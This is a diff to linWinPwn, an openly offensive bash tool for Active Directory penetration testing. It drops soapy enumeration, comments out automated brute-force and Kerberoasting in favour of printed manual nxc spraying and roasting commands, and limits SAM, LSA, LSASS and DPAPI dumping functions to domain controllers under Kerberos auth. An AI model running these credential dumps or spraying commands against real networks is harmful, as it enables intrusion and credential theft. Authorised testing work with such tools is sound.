@@ -130,7 +130,6 @@ ldapnomnom="$scripts_dir/ldapnomnom"
 godap="$scripts_dir/godap"
 mssqlpwner=$(which mssqlpwner)
 aesKrbKeyGen="$scripts_dir/aesKrbKeyGen.py"
-soapy=$(which soapy)
 nmap=$(which nmap)
 john=$(which john)
 python3="${scripts_dir}/.venv/bin/python3"
@@ -144,7 +143,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.32 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.31 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -173,9 +172,9 @@ help_linWinPwn() {
     echo -e "--verbose           Enable all verbose and debug outputs"
     echo -e "-I/--interface      Attacker's network interface (default: eth0)"
     echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan and Pwd Dump (default: Domain Controllers)"
-    echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
     echo -e "-U/--userwordlist   Custom username list used during Null session checks"
     echo -e "-P/--passwordlist   Custom password list used during password cracking"
+    echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
     echo -e ""
     echo -e "${YELLOW}Example usages${NC}"
     echo -e "$(pwd)/$(basename "$0") -t dc_ip ${CYAN}(No password for anonymous login)${NC}" >&2
@@ -581,7 +580,6 @@ authenticate() {
         argument_evilwinrm="-u '${user}' -p '${password}'"
         argument_godap="-u '${user}'@${domain} -p '${password}'"
         argument_mssqlpwner="${domain}/'${user}':'${password}'"
-        argument_soapy="${domain}/'${user}':'${password}'"
         hash_bool=false
         kerb_bool=false
         unset KRB5CCNAME
@@ -650,7 +648,6 @@ authenticate() {
                 argument_evilwinrm="-u '${user}' -H ${hash:33}"
                 argument_godap="-u '${user}' -d ${domain} -H ${hash}"
                 argument_mssqlpwner="-hashes ${hash} ${domain}/'${user}'"
-                argument_soapy="--hash ${hash:33} ${domain}/'${user}'"
                 auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}"
             else
                 echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
@@ -847,7 +844,6 @@ authenticate() {
         argument_privexchange="${argument_privexchange} --debug"
         argument_adcheck="${argument_adcheck} --debug"
         argument_mssqlpwner="-debug ${argument_mssqlpwner}"
-        argument_soapy="--debug ${argument_soapy}"
     fi
 
     echo -e "${auth_string}"
@@ -959,7 +955,7 @@ bhd_enum() {
                 cd "${output_dir}/DomainRecon/BloodHound" || exit
                 if [ "${ldapbinding_bool}" == true ]; then ldapbinding_param="--ldap-channel-binding"; else ldapbinding_param=""; fi
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbinding_param}"; else ldaps_param=""; fi
-                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN} ${ldaps_param}" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt"
+                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 15 --dns-tcp -dc ${dc_FQDN} ${ldaps_param}" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 #run_command "${netexec} ${ne_verbose} ldap ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt"
@@ -989,7 +985,7 @@ bhd_enum_dconly() {
                 cd "${output_dir}/DomainRecon/BloodHound" || exit
                 if [ "${ldapbinding_bool}" == true ]; then ldapbinding_param="--ldap-channel-binding"; else ldapbinding_param=""; fi
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbinding_param}"; else ldaps_param=""; fi
-                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN} ${ldaps_param}" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt"
+                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 15 --dns-tcp -dc ${dc_FQDN} ${ldaps_param}" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 #run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c DCOnly --log tee ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt"
@@ -1016,7 +1012,7 @@ bhdce_enum() {
             else
                 current_dir=$(pwd)
                 cd "${output_dir}/DomainRecon/BloodHoundCE" || exit
-                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_${dc_domain}.txt"
+                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 15 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt"
                 /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt"
@@ -1043,7 +1039,7 @@ bhdce_enum_dconly() {
             else
                 current_dir=$(pwd)
                 cd "${output_dir}/DomainRecon/BloodHoundCE" || exit
-                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_dconly_${dc_domain}.txt"
+                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 15 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_dconly_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt"
                 /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt"
@@ -1157,6 +1153,8 @@ ne_ldap_enum() {
     run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --password-not-required --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_passnotrequired_output_${dc_domain}.txt" 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
+    echo -e 'cat *_users.json | jq -r ".data[] | select(.Properties.enabled == true) | \"Username:\(.Properties.name) Description: \(.Properties.description)\"" | tee descriptions.txt | grep -v null'
+    echo -e 'cat *_computers.json | jq -r ".data[] | select(.Properties.enabled == true) | \"Username:\(.Properties.name) Description: \(.Properties.description)\"" | tee descriptions.txt | grep -v null'
     run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}" >"${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt"
     grep -i "pass\|pwd" "${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt" 2>/dev/null | tee "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" 2>&1
     if [ ! -s "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" ]; then
@@ -1654,30 +1652,6 @@ adcheck_enum() {
     echo -e ""
 }
 
-soapy_enum() {
-    if [ ! -f "${soapy}" ]; then
-        echo -e "${RED}[-] Please verify the installation of soapy${NC}"
-    else
-        mkdir -p "${output_dir}/DomainRecon/soapy"
-        echo -e "${BLUE}[*] soapy Enumeration${NC}"
-        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-            echo -e "${PURPLE}[-] soapy requires credentials and does not support Kerberos authentication${NC}"
-        else
-            cd "${output_dir}/DomainRecon/soapy" || exit
-            run_command "${soapy} --ts --users ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_users_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --computers ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_computers_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --groups ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_groups_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --constrained ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_constrained_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --unconstrained ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_unconstrained_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --spns ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_spns_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --asreproastable ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_asreproastable_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --admins ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_admins_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --rbcds ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_rbcds_output_${dc_domain}.txt"
-        fi
-    fi
-    echo -e ""
-}
-
 ###### adcs_enum: ADCS Enumeration
 ne_adcs_enum() {
     mkdir -p "${output_dir}/ADCS"
@@ -1964,6 +1938,10 @@ masky_dump() {
     else
         ne_adcs_enum
         if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
+            if [ "${kerb_bool}" == true ]; then
+                echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+                curr_targets="Domain Controllers"
+            fi
             smb_scan
             i=0
             for pki_server in $pki_servers; do
@@ -2464,6 +2442,10 @@ smb_map() {
 }
 
 ne_shares() {
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     echo -e "${BLUE}[*] Enumerating Shares using netexec ${NC}"
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --shares --log ${output_dir}/Shares/ne_shares_output_${dc_domain}.txt" 2>&1
@@ -2477,6 +2459,10 @@ ne_shares() {
 }
 
 ne_spider() {
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     echo -e "${BLUE}[*] Spidering Shares using netexec ${NC}"
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_output_${dc_domain}.txt" 2>&1
@@ -2588,6 +2574,10 @@ zerologon_check() {
 
 ms17-010_check() {
     echo -e "${BLUE}[*] MS17-010 check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ms17-010 --log ${output_dir}/Vulnerabilities/ne_ms17-010_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2595,6 +2585,10 @@ ms17-010_check() {
 
 coerceplus_check() {
     echo -e "${BLUE}[*] coerce check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M coerce_plus --log ${output_dir}/Vulnerabilities/ne_coerce_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2602,6 +2596,10 @@ coerceplus_check() {
 
 spooler_check() {
     echo -e "${BLUE}[*] Print Spooler check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spooler --log ${output_dir}/Vulnerabilities/ne_spooler_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2609,6 +2607,10 @@ spooler_check() {
 
 printnightmare_check() {
     echo -e "${BLUE}[*] Print Nightmare check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M printnightmare --log ${output_dir}/Vulnerabilities/ne_printnightmare_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2616,6 +2618,10 @@ printnightmare_check() {
 
 webdav_check() {
     echo -e "${BLUE}[*] WebDAV check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M webdav --log ${output_dir}/Vulnerabilities/ne_webdav_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2623,6 +2629,10 @@ webdav_check() {
 
 smbsigning_check() {
     echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --gen-relay-list ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" 2>&1
     if [ ! -s "${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" ]; then
@@ -2633,6 +2643,10 @@ smbsigning_check() {
 
 ntlmv1_check() {
     echo -e "${BLUE}[*] ntlmv1 check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ntlmv1 --log ${output_dir}/Vulnerabilities/ne_ntlmv1_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2640,6 +2654,10 @@ ntlmv1_check() {
 
 smbghost_check() {
     echo -e "${BLUE}[*] smbghost check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M smbghost --log ${output_dir}/Vulnerabilities/ne_smbghost_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2647,6 +2665,10 @@ smbghost_check() {
 
 runasppl_check() {
     echo -e "${BLUE}[*] runasppl check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M runasppl --log ${output_dir}/Vulnerabilities/ne_runasppl_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2774,20 +2796,20 @@ mssql_enum() {
     echo -e ""
 }
 
-mssql_relay_check() {
-    if [ ! -f "${mssqlrelay}" ]; then
-        echo -e "${RED}[-] Please verify the location of mssqlrelay${NC}"
-    else
-        if [ "${nullsess_bool}" == true ]; then
-            echo -e "${PURPLE}[-] mssqlrelay requires credentials${NC}"
-        else
-            echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
-            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -ns ${dc_ip} -dns-tcp -windows-auth" | tee "${output_dir}/MSSQL/mssql_relay_output_${dc_domain}.txt" 2>&1
-        fi
-    fi
-    echo -e ""
-}
+#mssql_relay_check() {
+#    if [ ! -f "${mssqlrelay}" ]; then
+#        echo -e "${RED}[-] Please verify the location of mssqlrelay${NC}"
+#    else
+#        if [ "${nullsess_bool}" == true ]; then
+#            echo -e "${PURPLE}[-] mssqlrelay requires credentials${NC}"
+#        else
+#            echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
+#            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
+#            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -ns ${dc_ip} -dns-tcp -windows-auth" | tee "${output_dir}/MSSQL/mssql_relay_output_${dc_domain}.txt" 2>&1
+#        fi
+#    fi
+#    echo -e ""
+#}
 
 mssqlclient_console() {
     if [ ! -f "${impacket_mssqlclient}" ]; then
@@ -3320,6 +3342,10 @@ add_spn_constrained() {
 ###### pwd_dump: Password Dump
 juicycreds_dump() {
     echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
     smb_scan
     for i in $(/bin/cat "${servers_smb_list}"); do
         echo -e "${CYAN}[*] Searching in ${i} ${NC}"
@@ -3420,6 +3446,10 @@ sam_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
     else
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
@@ -3434,6 +3464,10 @@ lsa_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
     else
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
@@ -3448,6 +3482,10 @@ lsassy_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
@@ -3462,6 +3500,10 @@ handlekatz_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
@@ -3476,6 +3518,10 @@ procdump_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
@@ -3490,6 +3536,10 @@ nanodump_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
@@ -3504,6 +3554,10 @@ dpapi_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] DPAPI dump requires credentials${NC}"
     else
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
@@ -3702,9 +3756,9 @@ ad_enum() {
         bhd_enum
         ldapdomaindump_enum
         enum4linux_enum
-        ne_gpp
         ne_smb_enum
         ne_ldap_enum
+        ne_gpp
         deleg_enum
         bloodyad_all_enum
         bloodyad_write_enum
@@ -3734,27 +3788,29 @@ bruteforce() {
     if [ "${nullsess_bool}" == true ]; then
         ridbrute_attack
         kerbrute_enum
-        userpass_kerbrute_check
-        ne_pre2k
+        #userpass_kerbrute_check
+        #ne_pre2k
     else
-        userpass_kerbrute_check
-        ne_pre2k
+        #userpass_kerbrute_check
+        #ne_pre2k
+        echo Deus Vult
     fi
 }
 
 kerberos() {
     mkdir -p "${output_dir}/Kerberos"
     if [ "${nullsess_bool}" == true ]; then
-        asrep_attack
-        kerberoast_attack
-        asreprc4_attack
-        john_crack_asrep
-        john_crack_kerberoast
+        #asrep_attack
+        #kerberoast_attack
+        #asreprc4_attack
+        #john_crack_asrep
+        #john_crack_kerberoast
+        echo Deus Vult
     else
-        asrep_attack
-        kerberoast_attack
-        john_crack_asrep
-        john_crack_kerberoast
+        #asrep_attack
+        #kerberoast_attack
+        #john_crack_asrep
+        #john_crack_kerberoast
         nopac_check
         ms14-068_check
     fi
@@ -3976,7 +4032,6 @@ ad_menu() {
     echo -e "27) Run godap console"
     echo -e "28) Run adPEAS enumerations"
     echo -e "29) Run ADCheck enumerations"
-    echo -e "30) Run soapy enumerations"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4140,11 +4195,6 @@ ad_menu() {
 
     29)
         adcheck_enum
-        ad_menu
-        ;;
-
-    30)
-        soapy_enum
         ad_menu
         ;;
 
@@ -4642,7 +4692,7 @@ kerberos_menu() {
             echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}"
             read -rp ">> " rc4_or_aes </dev/tty
             while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
-                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':${NC}"
                 read -rp ">> " rc4_or_aes </dev/tty
             done
             gethash_user="krbtgt"
@@ -5730,8 +5780,7 @@ config_menu() {
         if [ ! -x "${ldapnomnom}" ]; then echo -e "${RED}[-] ldapnomnom is not executable${NC}"; else echo -e "${GREEN}[+] ldapnomnom is executable${NC}"; fi
         if [ ! -f "${godap}" ]; then echo -e "${RED}[-] godap is not installed${NC}"; else echo -e "${GREEN}[+] godap is installed${NC}"; fi
         if [ ! -x "${godap}" ]; then echo -e "${RED}[-] godap is not executable${NC}"; else echo -e "${GREEN}[+] godap is executable${NC}"; fi
-        if [ ! -f "${mssqlpwner}" ]; then echo -e "${RED}[-] mssqlpwner  is not installed${NC}"; else echo -e "${GREEN}[+] mssqlpwner  is installed${NC}"; fi
-        if [ ! -f "${soapy }" ]; then echo -e "${RED}[-] soapy  is not installed${NC}"; else echo -e "${GREEN}[+] soapy  is installed${NC}"; fi
+        if [ ! -f "${mssqlpwner}" ]; then echo -e "${RED}[-] mssqlpwner is not installed${NC}"; else echo -e "${GREEN}[+] mssqlpwner is installed${NC}"; fi
         config_menu
         ;;
 
@@ -5930,12 +5979,14 @@ main() {
         echo -e "${GREEN}[+] Start: ADCS Enumeration${NC}"
         echo -e "${GREEN}---------------------------${NC}"
         echo -e ""
-        adcs_enum
-        echo -e "${GREEN}[+] Start: User and password Brute force Attacks${NC}"
-        echo -e "${GREEN}------------------------------------------------${NC}"
-        echo -e ""
-        bruteforce
-        echo -e "${GREEN}[+] Start: Kerberos-based Attacks${NC}"
+	adcs_enum
+	echo -e "${GREEN}[+] Manual: Username = Pass: nxc smb ${target} -u ${target_userslist} -p ${target_userslist} --no-bruteforce --continue-on-success${NC}" | tee "${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt"
+	echo -e "${GREEN}------------------------------------------------${NC}"
+	echo -e ""
+	bruteforce
+        echo -e "${GREEN}[+] Manual: Kerberos-based Attacks${NC}"
+        echo -e "${GREEN}nxc ldap -u ${user} -p ${password} -d ${domain} --kerberoast kerberoast.txt${NC}"
+        echo -e "${GREEN}nxc ldap -u ${user} -p ${password} -d ${domain} --asreproast asreproast.txt${NC}"
         echo -e "${GREEN}----------------------------------${NC}"
         echo -e ""
         kerberos
